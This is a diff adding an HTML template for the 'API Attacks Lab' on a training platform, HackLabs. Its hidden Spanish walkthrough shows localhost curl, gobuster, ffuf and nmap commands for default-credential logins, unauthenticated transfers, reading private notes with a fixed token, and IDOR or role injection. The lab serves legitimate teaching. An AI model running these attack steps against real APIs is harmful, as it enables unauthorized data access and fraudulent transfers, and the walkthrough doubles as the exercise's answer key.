@@ -1,0 +1,126 @@
+{% extends "base.html" %}
+{% block title %}API Attacks Lab – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+  <div class="hl-card mb-4">
+    <h2 class="text-sm font-semibold" style="color:var(--hl-primary)">API Attacks Lab</h2>
+    <p class="text-sm text-gray-600 dark:text-gray-400 mt-3 mb-3">
+      Explora y explota vulnerabilidades en una API moderna. No se dan pistas en esta sección.
+    </p>
+  </div>
+
+  <div class="hl-card mb-4">
+    <h3 class="text-sm font-semibold" style="color:var(--hl-primary)">Objetivos</h3>
+    <ul class="text-sm text-gray-600 dark:text-gray-400 mt-3 pl-5 list-disc">
+      <li>Identificar endpoints y métodos expuestos por la API.</li>
+      <li>Enumerar usuarios y recursos accesibles.</li>
+      <li>Encontrar puntos donde la autenticación o validación son insuficientes.</li>
+      <li>Exfiltrar datos sensibles o forzar transferencias si la lógica es vulnerable.</li>
+    </ul>
+
+    <h3 class="text-sm font-semibold mt-4" style="color:var(--hl-primary)">Endpoints disponibles</h3>
+    <ul class="text-sm text-gray-600 dark:text-gray-400 mt-2 pl-5 list-disc">
+      <li><code>GET /api/v1/users</code> — listar usuarios (público o con token).</li>
+      <li><code>POST /api/v1/auth</code> — autenticación, devuelve token.</li>
+      <li><code>POST /api/v1/transfer</code> — transferencias entre cuentas.</li>
+      <li><code>GET /api/v1/notes</code> — notas privadas por usuario.</li>
+    </ul>
+  </div>
+
+  <!-- Resolución del lab: caja flotante (todo el contenido de ayuda/solución debe ir aquí) -->
+  <div id="resolution-data" class="hidden">
+    <div class="lang-content" data-lang="es">
+      <h3>RESOLUCIÓN — API ATTACKS LAB</h3>
+      <ol>
+        <li><strong>Reconocimiento de la API</strong>
+          <ul>
+            <li>Enumera endpoints y métodos expuestos (GET/POST/OPTIONS). Herramientas útiles: <code>curl</code>, <code>httpie</code>, <code>nmap</code>, <code>gobuster</code>.</li>
+            <li>Busca documentación pública (OpenAPI/Swagger) en rutas comunes: <code>/openapi.json</code>, <code>/swagger.json</code>, <code>/docs</code>.</li>
+          </ul>
+        </li>
+        <li><strong>Reconocimiento y enumeración (comandos)</strong>
+          <pre><code class="language-bash"># Probar métodos HTTP y cabeceras
+curl -I -X OPTIONS http://localhost:5000/api/v1/users
+
+# Buscar documentación OpenAPI/Swagger
+curl http://localhost:5000/openapi.json || curl http://localhost:5000/swagger.json
+
+# Enumeración con gobuster (paths comunes)
+gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,json -t 50
+
+# Fuzzing de endpoints API con ffuf
+ffuf -u "http://localhost:5000/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302
+
+# Escaneo de puertos internos (si es posible)
+nmap -Pn -p- 127.0.0.1
+
+# Peticiones rápidas y formateo JSON (usa jq para extraer fields)
+curl -s http://localhost:5000/api/v1/users | jq .
+</code></pre>
+        </li>
+        <li><strong>Dificultad: Fácil</strong>
+          <ul>
+            <li>Prueba autenticaciones débiles con credenciales por defecto:
+              <pre><code class="language-bash">curl -X POST http://localhost:5000/api/v1/auth \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":"admin"}'</code></pre>
+            </li>
+            <li>Lista usuarios y recursos públicos:
+              <pre><code class="language-bash">curl http://localhost:5000/api/v1/users</code></pre>
+            </li>
+            <li>Prueba operaciones sin autenticación (transferencias, lectura de notas):
+              <pre><code class="language-bash">curl -X POST http://localhost:5000/api/v1/transfer \
+  -H 'Content-Type: application/json' \
+  -d '{"amount":100,"to":"admin"}'
+curl http://localhost:5000/api/v1/notes</code></pre>
+          </ul>
+        </li>
+        <li><strong>Dificultad: Media</strong>
+          <ul>
+            <li>Algunos endpoints requieren token: intenta obtener token y reutilizarlo en cabeceras <code>Authorization: Bearer &lt;token&gt;</code>.
+              <pre><code class="language-bash">TOKEN=$(curl -s -X POST http://localhost:5000/api/v1/auth -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin"}' | jq -r .token)
+curl http://localhost:5000/api/v1/notes -H "Authorization: Bearer $TOKEN"</code></pre>
+            </li>
+            <li>Prueba confirmaciones faltantes o validaciones insuficientes en transferencias (parametro <code>confirm</code>):
+              <pre><code class="language-bash">curl -X POST http://localhost:5000/api/v1/transfer \
+  -H 'Content-Type: application/json' \
+  -d '{"amount":100,"to":"admin","confirm":"yes"}'</code></pre>
+            </li>
+          </ul>
+        </li>
+        <li><strong>Dificultad: Difícil</strong>
+          <ul>
+            <li>En niveles altos, se exige cabecera específica: <code>Authorization: Bearer hacklabs-integrity-token</code>. Busca cómo derivar o forjar este token (exfil, endpoint leakage, reuso).</li>
+            <li>Si un endpoint restringe por rol, intenta escalados vía IDOR o manipulación de parámetros JSON (por ejemplo, inyectar <code>"role":"admin"</code> en objetos mal validados).</li>
+          </ul>
+        </li>
+      </ol>
+
+      <h4>Comandos de ejemplo</h4>
+      <pre><code class="language-bash"># Autenticación insegura
+curl -X POST http://localhost:5000/api/v1/auth -H 'Content-Type: application/json' -d '{"username":"victim","password":"password123"}'
+
+# Enumerar usuarios
+curl http://localhost:5000/api/v1/users
+
+# Transferencia vulnerable (sin confirmación)
+curl -X POST http://localhost:5000/api/v1/transfer -H 'Content-Type: application/json' -d '{"amount":100,"to":"admin"}'
+
+# Acceso a notas privadas (con token si aplica)
+curl http://localhost:5000/api/v1/notes -H 'Authorization: Bearer hacklabs-integrity-token'
+</code></pre>
+
+      <h4>Referencias y herramientas</h4>
+      <ul>
+        <li><a href="https://owasp.org/www-project-api-security/" target="_blank" rel="noopener">OWASP API Security</a></li>
+        <li><a href="https://portswigger.net/web-security/api" target="_blank" rel="noopener">PortSwigger – API Security</a></li>
+      </ul>
+    </div>
+    <div class="lang-content" data-lang="en" style="display:none">
+      <h3>Resolution — API Attacks Lab</h3>
+      <p>Use the Spanish tab for the full walkthrough. This English placeholder mirrors the Spanish guidance.</p>
+    </div>
+  </div>
+</div>
+{% endblock %}
